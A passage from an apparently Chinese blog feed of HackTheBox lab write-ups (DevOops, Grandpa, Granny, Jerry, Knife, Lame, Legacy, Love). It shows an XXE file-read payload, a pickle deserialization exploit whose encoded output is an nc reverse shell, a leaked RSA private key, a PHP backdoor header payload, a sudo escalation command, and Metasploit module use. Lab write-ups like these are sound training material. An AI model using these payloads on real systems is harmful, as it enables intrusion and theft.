<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">replace</span> <span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY example SYSTEM "file:///etc/passwd"> </span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Author</span><span class="token punctuation">></span></span>Lee<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Author</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Subject</span><span class="token punctuation">></span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Subject</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Content</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&example;">&amp;example;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Content</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></code></pre>

<img src="/Hackthebox/htb/htb-devoops/image-20250221230704068.png" class="" title="&#x2F;etc&#x2F;passwd">

<p>访问网站首页可以看到</p>
<p>修改xml读取feed.py</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">replace</span> <span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY example SYSTEM "file:////home/roosa/deploy/src/feed.py"> </span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Author</span><span class="token punctuation">></span></span>Lee<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Author</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Subject</span><span class="token punctuation">></span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Subject</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Content</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&example;">&amp;example;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Content</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></code></pre>

<p>分析feed.py 文件，提交POST请求时候调用了pickle进行反序列化</p>
<img src="/Hackthebox/htb/htb-devoops/image-20250221233304683.png" class="" title="读取feed.py">

<p>利用pickle反序列化漏洞，构造一个反弹shell，提交POST请求包，可成功接收到shell</p>
<pre class="language-python" data-language="python"><code class="language-python">$ python2                                               
Python <span class="token number">2.7</span><span class="token number">.18</span> <span class="token punctuation">(</span>default<span class="token punctuation">,</span> Aug  <span class="token number">1</span> <span class="token number">2022</span><span class="token punctuation">,</span> <span class="token number">06</span><span class="token punctuation">:</span><span class="token number">23</span><span class="token punctuation">:</span><span class="token number">55</span><span class="token punctuation">)</span> 
<span class="token punctuation">[</span>GCC <span class="token number">12.1</span><span class="token number">.0</span><span class="token punctuation">]</span> on linux2
Type <span class="token string">"help"</span><span class="token punctuation">,</span> <span class="token string">"copyright"</span><span class="token punctuation">,</span> <span class="token string">"credits"</span> <span class="token keyword">or</span> <span class="token string">"license"</span> <span class="token keyword">for</span> more information<span class="token punctuation">.</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">import</span> pickle
<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">import</span> os
<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">from</span> base64 <span class="token keyword">import</span> urlsafe_b64encode
<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">class</span> <span class="token class-name">exp</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>   		cmd <span class="token operator">=</span> <span class="token string">"反弹shell"</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>         <span class="token keyword">return</span> os<span class="token punctuation">.</span>system<span class="token punctuation">,</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span><span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> 
<span class="token operator">>></span><span class="token operator">></span> urlsafe_b64encode<span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>exp<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token string">'Y3Bvc2l4CnN5c3RlbQpwMAooUydybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXxuYyAxMC4xMC4xNi4zMCA4MDAxID4vdG1wL2YnCnAxCnRwMgpScDMKLg=='</span>
</code></pre>

<img src="/Hackthebox/htb/htb-devoops/image-20250221235447552.png" class="" title="Getshell">

<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>在&#x2F;home&#x2F;roosa&#x2F;work&#x2F;blogfeed 目录下，使用git log 查看commit记录可以找到一条关于密钥的记录</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">    reverted accidental commit with proper key
commit d387abf63e05c9628a59195cec9311751bdb283f
Author: Roosa Hakkerson <span class="token operator">&lt;</span>roosa@solita.fi<span class="token operator">></span>
Date:   Mon Mar <span class="token number">19</span> 09:32:03 <span class="token number">2018</span> <span class="token parameter variable">-0400</span></code></pre>

<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> <span class="token function">diff</span> d387abf63e05c9628a59195cec9311751bdb283f
<span class="token operator">&lt;</span>ed$ <span class="token function">git</span> <span class="token function">diff</span> d387abf63e05c9628a59195cec9311751bdb283f                       
WARNING: terminal is not fully functional
-  <span class="token punctuation">(</span>press RETURN<span class="token punctuation">)</span>
<span class="token function">diff</span> <span class="token parameter variable">--git</span> a/resources/integration/authcredentials.key b/resources/integration/a
uthcredentials.key
index 44c981f<span class="token punctuation">..</span>f4bde49 <span class="token number">100644</span>
--- a/resources/integration/authcredentials.key
+++ b/resources/integration/authcredentials.key
@@ -1,28 +1,27 @@
 -----BEGIN RSA PRIVATE KEY-----
-MIIEogIBAAKCAQEArDvzJ0k7T856dw2pnIrStl0GwoU/WFI+OPQcpOVj9DdSIEde
-8PDgpt/tBpY7a/xt3sP5rD7JEuvnpWRLteqKZ8hlCvt+4oP7DqWXoo/hfaUUyU5i
-vr+5Ui0nD+YBKyYuiN+4CB8jSQvwOG+LlA3IGAzVf56J0WP9FILH/NwYW2iovTRK
-nz1y2vdO3ug94XX8y0bbMR9Mtpj292wNrxmUSQ5glioqrSrwFfevWt/rEgIVmrb+
-CCjeERnxMwaZNFP0SYoiC5HweyXD6ZLgFO4uOVuImILGJyyQJ8u5BI2mc/SHSE0c
-F9DmYwbVqRcurk3yAS+jEbXgObupXkDHgIoMCwIDAQABAoIBAFaUuHIKVT+UK2oH
-uzjPbIdyEkDc3PAYP+E/jdqy2eFdofJKDocOf9BDhxKlmO968PxoBe25jjjt0AAL
-gCfN5I+xZGH19V4HPMCrK6PzskYII3/i4K7FEHMn8ZgDZpj7U69Iz2l9xa4lyzeD
-k2X0256DbRv/ZYaWPhX+fGw3dCMWkRs6MoBNVS4wAMmOCiFl3hzHlgIemLMm6QSy
<span class="token parameter variable">-NnTtLPXwkS84KMfZGbnolAiZbHAqhe5cRfV2CVw2U8GaIS3fqV3ioD0qqQjIIPNM</span>
-HSRik2J/7Y7OuBRQN+auzFKV7QeLFeROJsLhLaPhstY5QQReQr9oIuTAs9c+oCLa
-2fXe3kkCgYEA367aoOTisun9UJ7ObgNZTDPeaXajhWrZbxlSsOeOBp5CK/oLc0RB
-GLEKU6HtUuKFvlXdJ22S4/rQb0RiDcU/wOiDzmlCTQJrnLgqzBwNXp+MH6Av9WHG
-jwrjv/loHYF0vXUHHRVJmcXzsftZk2aJ29TXud5UMqHovyieb3mZ0pcCgYEAxR41
-IMq2dif3laGnQuYrjQVNFfvwDt1JD1mKNG8OppwTgcPbFO+R3+MqL7lvAhHjWKMw
-+XjmkQEZbnmwf1fKuIHW9uD9KxxHqgucNv9ySuMtVPp/QYtjn/ltojR16JNTKqiW
-7vSqlsZnT9jR2syvuhhVz4Ei9yA/VYZG2uiCpK0CgYA/UOhz+LYu/MsGoh0+yNXj
-Gx+O7NU2s9sedqWQi8sJFo0Wk63gD+b5TUvmBoT+HD7NdNKoEX0t6VZM2KeEzFvS
-iD6fE+5/i/rYHs2Gfz5NlY39ecN5ixbAcM2tDrUo/PcFlfXQhrERxRXJQKPHdJP7
-VRFHfKaKuof+bEoEtgATuwKBgC3Ce3bnWEBJuvIjmt6u7EFKj8CgwfPRbxp/INRX
-S8Flzil7vCo6C1U8ORjnJVwHpw12pPHlHTFgXfUFjvGhAdCfY7XgOSV+5SwWkec6
-md/EqUtm84/VugTzNH5JS234dYAbrx498jQaTvV8UgtHJSxAZftL8UAJXmqOR3ie
<span class="token parameter variable">-LWXpAoGADMbq4aFzQuUPldxr3thx0KRz9LJUJfrpADAUbxo8zVvbwt4gM2vsXwcz</span>
-oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
<span class="token parameter variable">-LS4O7JPRqVmgZzUUnDiAVuUHWuHGGXpWpz9EGau6dIbQaUUSOEE</span><span class="token operator">=</span>
-----END RSA PRIVATE KEY-----
</code></pre>

<p>提取密钥保存到本地，使用ssh 登录root账号</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEArDvzJ0k7T856dw2pnIrStl0GwoU/WFI+OPQcpOVj9DdSIEde
8PDgpt/tBpY7a/xt3sP5rD7JEuvnpWRLteqKZ8hlCvt+4oP7DqWXoo/hfaUUyU5i
vr+5Ui0nD+YBKyYuiN+4CB8jSQvwOG+LlA3IGAzVf56J0WP9FILH/NwYW2iovTRK
nz1y2vdO3ug94XX8y0bbMR9Mtpj292wNrxmUSQ5glioqrSrwFfevWt/rEgIVmrb+
CCjeERnxMwaZNFP0SYoiC5HweyXD6ZLgFO4uOVuImILGJyyQJ8u5BI2mc/SHSE0c
F9DmYwbVqRcurk3yAS+jEbXgObupXkDHgIoMCwIDAQABAoIBAFaUuHIKVT+UK2oH
uzjPbIdyEkDc3PAYP+E/jdqy2eFdofJKDocOf9BDhxKlmO968PxoBe25jjjt0AAL
gCfN5I+xZGH19V4HPMCrK6PzskYII3/i4K7FEHMn8ZgDZpj7U69Iz2l9xa4lyzeD
k2X0256DbRv/ZYaWPhX+fGw3dCMWkRs6MoBNVS4wAMmOCiFl3hzHlgIemLMm6QSy
NnTtLPXwkS84KMfZGbnolAiZbHAqhe5cRfV2CVw2U8GaIS3fqV3ioD0qqQjIIPNM
HSRik2J/7Y7OuBRQN+auzFKV7QeLFeROJsLhLaPhstY5QQReQr9oIuTAs9c+oCLa
2fXe3kkCgYEA367aoOTisun9UJ7ObgNZTDPeaXajhWrZbxlSsOeOBp5CK/oLc0RB
GLEKU6HtUuKFvlXdJ22S4/rQb0RiDcU/wOiDzmlCTQJrnLgqzBwNXp+MH6Av9WHG
jwrjv/loHYF0vXUHHRVJmcXzsftZk2aJ29TXud5UMqHovyieb3mZ0pcCgYEAxR41
IMq2dif3laGnQuYrjQVNFfvwDt1JD1mKNG8OppwTgcPbFO+R3+MqL7lvAhHjWKMw
+XjmkQEZbnmwf1fKuIHW9uD9KxxHqgucNv9ySuMtVPp/QYtjn/ltojR16JNTKqiW
7vSqlsZnT9jR2syvuhhVz4Ei9yA/VYZG2uiCpK0CgYA/UOhz+LYu/MsGoh0+yNXj
Gx+O7NU2s9sedqWQi8sJFo0Wk63gD+b5TUvmBoT+HD7NdNKoEX0t6VZM2KeEzFvS
iD6fE+5/i/rYHs2Gfz5NlY39ecN5ixbAcM2tDrUo/PcFlfXQhrERxRXJQKPHdJP7
VRFHfKaKuof+bEoEtgATuwKBgC3Ce3bnWEBJuvIjmt6u7EFKj8CgwfPRbxp/INRX
S8Flzil7vCo6C1U8ORjnJVwHpw12pPHlHTFgXfUFjvGhAdCfY7XgOSV+5SwWkec6
md/EqUtm84/VugTzNH5JS234dYAbrx498jQaTvV8UgtHJSxAZftL8UAJXmqOR3ie
LWXpAoGADMbq4aFzQuUPldxr3thx0KRz9LJUJfrpADAUbxo8zVvbwt4gM2vsXwcz
oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
<span class="token assign-left variable">LS4O7JPRqVmgZzUUnDiAVuUHWuHGGXpWpz9EGau6dIbQaUUSOEE</span><span class="token operator">=</span>
-----END RSA PRIVATE KEY-----
</code></pre>

<img src="/Hackthebox/htb/htb-devoops/image-20250222085122095.png" class="" title="Getshell">

<table>
<thead>
<tr>
<th align="left">Flag</th>
<th align="left">Path</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Flag1</td>
<td align="left">&#x2F;home&#x2F;roosa&#x2F;user.txt</td>
</tr>
<tr>
<td align="left">Flag2</td>
<td align="left">&#x2F;root&#x2F;root.txt</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>XXE</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Grandpa</title>
    <url>/Hackthebox/htb/htb-grandpa/</url>
    <content><![CDATA[<style>.eshfmoeturqm{zoom:50%;}</style><img src="/Hackthebox/htb/htb-grandpa/381683fd107da11f1dc916401ae8aee0.png" class="eshfmoeturqm">

<span id="more"></span>

<table>
<thead>
<tr>
<th>OS</th>
<th>Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td>Windows</td>
<td>Easy</td>
</tr>
</tbody></table>
<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><img src="/Hackthebox/htb/htb-grandpa/image-20250212200523195.png" class="" title="Nmap">

<p>发现80(IIS 6.0) 端口</p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用msfconsole <code>windows/iis/iis_webdav_scstoragepathfromurl</code> 模块进行漏洞利用</p>
<img src="/Hackthebox/htb/htb-grandpa/image-20250212201611096.png" class="" title="GetShell">

<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>使用 <code>local_exploit_suggester</code> 模块进行本地提权的信息收集  </p>
<img src="/Hackthebox/htb/htb-grandpa/image-20250212202135579.png" class="" title="信息收集">

<p>使用  <code>windows/local/ms14_070_tcpip_ioctl</code> 进行权限提升，提权失败</p>
<img src="/Hackthebox/htb/htb-grandpa/image-20250212202811599.png" class="" title="提权">

<p>列出进程，迁移进程 <code>migrate 3100</code>，然后重新提权</p>
<img src="/Hackthebox/htb/htb-grandpa/image-20250212202917826.png" class="" title="进程">

<img src="/Hackthebox/htb/htb-grandpa/image-20250212203009824.png" class="" title="GetShell">

<table>
<thead>
<tr>
<th>Flag</th>
<th align="left">Path</th>
</tr>
</thead>
<tbody><tr>
<td>Flag1</td>
<td align="left">C:\Documents and Settings\Harry\Desktop\user.txt</td>
</tr>
<tr>
<td>Flag2</td>
<td align="left">C:\Documents and Settings\Administrator\Desktop\root.txt</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>IIS</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Granny</title>
    <url>/Hackthebox/htb/htb-granny/</url>
    <content><![CDATA[<style>.buxykvbgqiui{zoom:50%;}</style><img src="/Hackthebox/htb/htb-granny/e8a122e2d713a4fb4a180bb9ccd20248.png" class="buxykvbgqiui">

<span id="more"></span>

<table>
<thead>
<tr>
<th align="left">OS</th>
<th align="left">Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Windows</td>
<td align="left">Easy</td>
</tr>
</tbody></table>
<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><img src="/Hackthebox/htb/htb-granny/image-20250212204730377.png" class="" title="Nmap">

<p>开放80(IIS 6.0) 端口并且开启了webdav</p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用msf <code>windows/iis/iis_webdav_upload_asp</code> 模块进行漏洞利用</p>
<img src="/Hackthebox/htb/htb-granny/image-20250212210017947.png" class="" title="GetShell">

<p>迁移进程</p>
<img src="/Hackthebox/htb/htb-granny/image-20250212210739530.png" class="" title="进程">

<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>使用local_exploit_suggester 模块进行信息收集</p>
<img src="/Hackthebox/htb/htb-granny/image-20250212205939579.png" class="" title="信息收集">

<p>使用ms15-051 进行提权</p>
<img src="/Hackthebox/htb/htb-granny/image-20250212210630257.png" class="" title="GetShell">

<table>
<thead>
<tr>
<th align="left">Flag</th>
<th align="left">Path</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Flag1</td>
<td align="left">C:\Documents and Settings\Lakis\Desktop\user.txt</td>
</tr>
<tr>
<td align="left">Flag2</td>
<td align="left">C:\Documents and Settings\Administrator\Desktop\root.txt</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>IIS</tag>
        <tag>配置错误</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Jerry</title>
    <url>/Hackthebox/htb/htb-jerry/</url>
    <content><![CDATA[<style>.hdpvfsadjkqt{zoom:50%;}</style><img src="/Hackthebox/htb/htb-jerry/59f03a24178dbb2bdc94968c201e21f8.png" class="hdpvfsadjkqt">

<span id="more"></span>

<table>
<thead>
<tr>
<th>OS</th>
<th>Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td>Windows</td>
<td>Easy</td>
</tr>
</tbody></table>
<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><img src="/Hackthebox/htb/htb-jerry/image-20250216152859389.png" class="" title="Nmap">

<p>开放8080(tomcat)，直接访问可以发现tomcat 默认管理页面</p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>访问目标，点击<code>Manager App</code> 在弹出的用户名密码界面，随便输入，就会跳转到403页面</p>
<img src="/Hackthebox/htb/htb-jerry/image-20250216154248837.png" class="" title="tomcat管理页面">

<p>页面中出现用户名密码，使用tomcat:s3cret 登录，可以看到部署页</p>
<img src="/Hackthebox/htb/htb-jerry/image-20250216154409280.png" class="" title="tomcat报错页面">

<p>使用msfvenom 生成后门，然后部署到tomcat， 点击应用名触发shell</p>
<img src="/Hackthebox/htb/htb-jerry/image-20250216154608561.png" class="" title="生成后门">

<img src="/Hackthebox/htb/htb-jerry/image-20250216154519146.png" class="" title="部署war包">

<img src="/Hackthebox/htb/htb-jerry/image-20250216155106484.png" class="" title="GetShell">

<table>
<thead>
<tr>
<th align="left">Flag</th>
<th align="left">Path</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Flag1</td>
<td align="left">C:\Users\Administrator\Desktop\flags\&#39;2 for the price of 1.txt’</td>
</tr>
<tr>
<td align="left">Flag2</td>
<td align="left">C:\Users\Administrator\Desktop\flags\&#39;2 for the price of 1.txt’</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>配置错误</tag>
        <tag>密码硬编码</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Knife</title>
    <url>/Hackthebox/htb/htb-knife/</url>
    <content><![CDATA[<style>.ozaobesumdde{zoom:50%;}</style><img src="/Hackthebox/htb/htb-knife/110fe6608793064cf171080150ebd0dc.png" class="ozaobesumdde">

<span id="more"></span>

<table>
<thead>
<tr>
<th>OS</th>
<th>Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td>Linux</td>
<td>Easy</td>
</tr>
</tbody></table>
<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><img src="/Hackthebox/htb/htb-knife/image-20250216104801646.png" class="" title="Nmap">

<p>开放了22(SSH)和80(HTTP)</p>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>使用whatweb获取web指纹 PHP 8.1.0-dev ，Google一下，存在一个后门</p>
<img src="/Hackthebox/htb/htb-knife/image-20250216104951989.png" class="" title="whatweb">

<img src="/Hackthebox/htb/htb-knife/image-20250216110740874.png" class="" title="image-20250216110740874">

<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>抓包，使用payload <code>User-Agentt: zerodiumsystem(&quot;id&quot;);</code></p>
<img src="/Hackthebox/htb/htb-knife/image-20250216110553497.png" class="" title="后门">

<p>直接反弹shell</p>
<img src="/Hackthebox/htb/htb-knife/image-20250216111124234.png" class="" title="反弹shell">

<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>使用sudo -l 查看有哪些可以利用的点，找到一个knife</p>
<img src="/Hackthebox/htb/htb-knife/image-20250216111432749.png" class="" title="提权">

<p>运行一下knife，发现可以执行命令</p>
<img src="/Hackthebox/htb/htb-knife/image-20250216112140995.png" class="" title="knife">

<p>使用<code>sudo knife exec --exec &quot;exec &#39;/bin/sh -i &#39;&quot;</code> 成功提权</p>
<img src="/Hackthebox/htb/htb-knife/image-20250216112920949.png" class="" title="GetShell">

<table>
<thead>
<tr>
<th align="left">Flag</th>
<th align="left">Path</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Flag1</td>
<td align="left">&#x2F;home&#x2F;james&#x2F;user.txt</td>
</tr>
<tr>
<td align="left">Flag2</td>
<td align="left">&#x2F;root&#x2F;root.txt</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>RCE</tag>
        <tag>后门</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Lame</title>
    <url>/Hackthebox/htb/htb-lame/</url>
    <content><![CDATA[<style>.xvhdtrkncsnn{zoom:50%;}</style><img src="/Hackthebox/htb/htb-lame/fb2d9f98400e3c802a0d7145e125c4ff.png" class="xvhdtrkncsnn">

<span id="more"></span>

<table>
<thead>
<tr>
<th>OS</th>
<th>Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td>Linux</td>
<td>Easy</td>
</tr>
</tbody></table>
<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><style>.fvolqicoodyv{zoom:150%;}</style><img src="/Hackthebox/htb/htb-lame/image-20250201155450222.png" class="fvolqicoodyv" alt="Nmap">

<p>发现两个可疑服务21(vsftpd 2.3.4)和445(Samba 3.0.20)，使用searchsploit 检索可用exp<img src="/Hackthebox/htb/htb-lame/image-20250201160141376.png" class="" title="searchploit"></p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用vsftpd的漏洞，失败，换smb漏洞, 成功</p>
<style>.vbpmaxanfurs{zoom:150%;}</style><img src="/Hackthebox/htb/htb-lame/image-20250201174838005.png" class="vbpmaxanfurs" alt="msfconsole">

<img src="/Hackthebox/htb/htb-lame/image-20250201175040335.png" class="" title="searchsploit">

<img src="/Hackthebox/htb/htb-lame/image-20250201175515940.png" class="" title="GetShell">

<table>
<thead>
<tr>
<th align="left">Flag</th>
<th>Path</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Flag1</td>
<td>&#x2F;home&#x2F;makis&#x2F;user.txt</td>
</tr>
<tr>
<td align="left">Flag2</td>
<td>&#x2F;root&#x2F;root.txt</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Legacy</title>
    <url>/Hackthebox/htb/htb-legacy/</url>
    <content><![CDATA[<style>.kdcdebfdydgn{zoom:50%;}</style><img src="/Hackthebox/htb/htb-legacy/60dc190c4c015cfe3a3aef9b5afca254.png" class="kdcdebfdydgn">

<span id="more"></span>

<table>
<thead>
<tr>
<th align="left">OS</th>
<th align="left">Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Windows</td>
<td align="left">Easy</td>
</tr>
</tbody></table>
<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><img src="/Hackthebox/htb/htb-legacy/image-20250201192659015.png" class="" title="Nmap">

<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>一个开了445端口的Windows XP，可以试试ms08067</p>
<img src="/Hackthebox/htb/htb-legacy/image-20250201193355321.png" class="" title="msfconsole">

<table>
<thead>
<tr>
<th align="left">Flag</th>
<th align="left">Path</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Flag1</td>
<td align="left">C:\Documents and Settings\john\Desktop\user.txt</td>
</tr>
<tr>
<td align="left">Flag2</td>
<td align="left">C:\Documents and Settings\Administrator\Desktop\root.txt</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>CVE</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Love</title>
    <url>/Hackthebox/htb/htb-love/</url>
    <content><![CDATA[<style>.jwujbowkyvdm{zoom:50%;}</style><img src="/Hackthebox/htb/htb-love/c00774d8d806b82c709c596937a92d14.png" class="jwujbowkyvdm">

<span id="more"></span>

<table>
<thead>
<tr>
<th align="left">OS</th>
<th align="left">Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Windows</td>
<td align="left">Easy</td>
</tr>
</tbody></table>
<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><pre class="language-bash" data-language="bash"><code class="language-bash"> nmap <span class="token number">10.10</span>.10.239 <span class="token parameter variable">-sV</span> <span class="token parameter variable">-sC</span>  -p- <span class="token parameter variable">-T4</span> --min-rate <span class="token number">1000</span> <span class="token parameter variable">-e</span> tun0
Starting Nmap <span class="token number">7.95</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2025</span>-02-22 <span class="token number">11</span>:34 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">10.10</span>.10.239
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.13s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">65516</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT      STATE SERVICE      VERSION
<span class="token number">80</span>/tcp    <span class="token function">open</span>  http         Apache httpd <span class="token number">2.4</span>.46 <span class="token punctuation">((</span>Win64<span class="token punctuation">)</span> OpenSSL/1.1.1j PHP/7.3.27<span class="token punctuation">)</span>
<span class="token operator">|</span> http-cookie-flags: 
<span class="token operator">|</span>   /: 
<span class="token operator">|</span>     PHPSESSID: 
<span class="token operator">|</span>_      httponly flag not <span class="token builtin class-name">set</span>
<span class="token operator">|</span>_http-title: Voting System using PHP
<span class="token operator">|</span>_http-server-header: Apache/2.4.46 <span class="token punctuation">(</span>Win64<span class="token punctuation">)</span> OpenSSL/1.1.1j PHP/7.3.27
<span class="token number">135</span>/tcp   <span class="token function">open</span>  msrpc        Microsoft Windows RPC
<span class="token number">139</span>/tcp   <span class="token function">open</span>  netbios-ssn  Microsoft Windows netbios-ssn
<span class="token number">443</span>/tcp   <span class="token function">open</span>  ssl/http     Apache httpd <span class="token number">2.4</span>.46 <span class="token punctuation">(</span>OpenSSL/1.1.1j PHP/7.3.27<span class="token punctuation">)</span>
<span class="token operator">|</span> tls-alpn: 
<span class="token operator">|</span>_  http/1.1
<span class="token operator">|</span> ssl-cert: Subject: <span class="token assign-left variable">commonName</span><span class="token operator">=</span>staging.love.htb/organizationName<span class="token operator">=</span>ValentineCorp/stateOrProvinceName<span class="token operator">=</span>m/countryName<span class="token operator">=</span>in
<span class="token operator">|</span> Not valid before: <span class="token number">2021</span>-01-18T14:00:16
<span class="token operator">|</span>_Not valid after:  <span class="token number">2022</span>-01-18T14:00:16
<span class="token operator">|</span>_http-server-header: Apache/2.4.46 <span class="token punctuation">(</span>Win64<span class="token punctuation">)</span> OpenSSL/1.1.1j PHP/7.3.27
<span class="token operator">|</span>_ssl-date: TLS randomness does not represent <span class="token function">time</span>
<span class="token operator">|</span>_http-title: <span class="token number">400</span> Bad Request
<span class="token number">445</span>/tcp   <span class="token function">open</span>  microsoft-ds Windows <span class="token number">10</span> Pro <span class="token number">19042</span> microsoft-ds <span class="token punctuation">(</span>workgroup: WORKGROUP<span class="token punctuation">)</span>
